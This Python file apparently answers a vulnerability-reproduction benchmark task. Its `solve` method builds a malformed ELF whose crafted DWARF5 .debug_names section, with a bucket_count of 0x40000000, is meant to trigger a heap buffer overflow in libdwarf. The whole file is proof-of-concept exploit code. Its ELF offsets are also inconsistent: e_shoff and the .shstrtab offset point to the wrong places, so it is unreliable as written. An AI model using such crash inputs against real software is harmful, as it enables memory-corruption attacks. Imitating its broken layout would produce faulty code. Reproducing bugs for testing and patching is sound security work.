import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This creates a malformed DWARF5 .debug_names section that triggers
        # the heap buffer overflow in libdwarf's dwarf_debugnames.c
        # The vulnerability is in the calculation of limits when reading
        # the .debug_names section
        
        # Create a minimal ELF header (64-bit)
        elf_header = bytearray()
        # e_ident
        elf_header.extend(b'\x7fELF')  # ELF magic
        elf_header.append(2)          # 64-bit
        elf_header.append(1)          # Little endian
        elf_header.append(1)          # ELF version
        elf_header.append(0)          # OS ABI (System V)
        elf_header.extend(b'\x00' * 8) # Padding
        
        # ELF header fields
        elf_header.extend(struct.pack('<HHIQQQIHHH', 
            2,              # e_type = ET_EXEC
            0x3e,           # e_machine = x86_64
            1,              # e_version
            0,              # e_entry
            0,              # e_phoff
            64,             # e_shoff (section header table offset)
            0,              # e_flags
            64,             # e_ehsize (ELF header size)
            0,              # e_phentsize
            0,              # e_phnum
            64,             # e_shentsize
            3,              # e_shnum (3 sections)
            2               # e_shstrndx (index of section name string table)
        ))
        
        # Create section headers
        sections = bytearray()
        
        # Section 0: NULL section
        sections.extend(b'\x00' * 64)
        
        # Section 1: .debug_names section header
        # sh_name (offset in .shstrtab) will be set later
        sections.extend(struct.pack('<IIQQQQIIQQ',
            1,              # sh_name offset in .shstrtab (will be 1)
            1,              # sh_type = SHT_PROGBITS
            0,              # sh_flags
            0,              # sh_addr
            128,            # sh_offset (where .debug_names starts)
            1551,           # sh_size (total size we're creating)
            0,              # sh_link
            0,              # sh_info
            1,              # sh_addralign
            0               # sh_entsize
        ))
        
        # Section 2: .shstrtab section header (string table for section names)
        sections.extend(struct.pack('<IIQQQQIIQQ',
            0,              # sh_name (null)
            3,              # sh_type = SHT_STRTAB
            0,              # sh_flags
            0,              # sh_addr
            1679,           # sh_offset (after .debug_names + alignment)
            15,             # sh_size (just enough for our strings)
            0,              # sh_link
            0,              # sh_info
            1,              # sh_addralign
            0               # sh_entsize
        ))
        
        # Create the malformed .debug_names section
        debug_names = bytearray()
        
        # DWARF5 .debug_names header
        # unit_length - using 64-bit format (0xFFFFFFFF followed by actual length)
        debug_names.extend(b'\xFF\xFF\xFF\xFF')  # 0xFFFFFFFF indicates 64-bit
        debug_names.extend(struct.pack('<Q', 0x5DC))  # Actual length (1500 bytes)
        
        debug_names.extend(struct.pack('<H', 5))      # version = 5
        debug_names.extend(struct.pack('<H', 0))      # padding
        
        # augmentation string (empty)
        debug_names.append(0)
        
        # Now create the main tables with bad values that trigger the overflow
        # The vulnerability is in the calculation of bucket array size
        # We set bucket_count to a value that causes an overflow in multiplication
        
        # Using values that would cause integer overflow when calculating:
        # bucket_array_size = bucket_count * sizeof(uint32_t)
        # If bucket_count is large enough, this can overflow to a small value
        # leading to undersized allocation but large loop iterations
        
        # Set bucket_count to a value near UINT32_MAX/4
        bucket_count = 0x40000000  # 1073741824
        
        # Set name_count to a reasonable value
        name_count = 100
        
        # Set abbreviation_count
        abbreviation_count = 1
        
        debug_names.extend(struct.pack('<III',
            bucket_count,       # bucket_count - large value that causes overflow
            name_count,         # name_count
            abbreviation_count  # abbreviation_count
        ))
        
        # augmentation_string_length
        debug_names.extend(struct.pack('<I', 0))
        
        # Create bucket array - minimal data since we'll overflow anyway
        # The bug causes reading beyond allocated memory
        for i in range(100):  # Only write 100 buckets, but bucket_count says 0x40000000
            debug_names.extend(struct.pack('<I', 0))
        
        # Create hash array for name_count entries
        for i in range(name_count):
            debug_names.extend(struct.pack('<I', i))
        
        # Create name index array
        for i in range(name_count):
            debug_names.extend(struct.pack('<I', i))
        
        # Create abbreviation table (just a minimal one)
        debug_names.append(0)  # Null terminator
        
        # Pad to reach target size
        remaining = 1551 - len(debug_names)
        debug_names.extend(b'\x00' * remaining)
        
        # Create .shstrtab section (string table for section names)
        shstrtab = bytearray()
        shstrtab.append(0)                     # Null at index 0
        shstrtab.extend(b'.debug_names\x00')   # Our section name at index 1
        shstrtab.extend(b'.shstrtab\x00')      # String table name at index 13
        
        # Build final ELF
        elf = bytearray()
        elf.extend(elf_header)
        elf.extend(b'\x00' * (128 - len(elf)))  # Padding to section offset
        
        # Add .debug_names section
        elf.extend(debug_names)
        
        # Add section headers
        elf.extend(sections)
        
        # Add .shstrtab section
        elf.extend(shstrtab)
        
        return bytes(elf)